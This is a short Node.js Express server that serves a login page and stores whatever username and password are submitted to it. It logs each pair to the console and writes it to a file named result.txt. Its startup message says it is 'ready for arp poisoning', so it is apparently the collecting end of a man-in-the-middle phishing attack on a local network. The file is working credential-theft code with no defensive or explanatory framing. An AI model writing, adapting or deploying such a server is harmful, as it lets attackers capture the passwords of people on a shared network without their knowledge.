import express from "express";
import bodyParser from "body-parser";
import fs from "fs";

const app = express();

app.use(bodyParser.urlencoded({extended: false}));

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} password: ${req.body.password}`
        console.log(data);
        fs.writeFile("result.txt", data, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
          });
        res.sendStatus(200);
        return;
    } catch(err) {
        console.log(err.name);
        res.sendStatus(404);
        return;
    }
});

app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));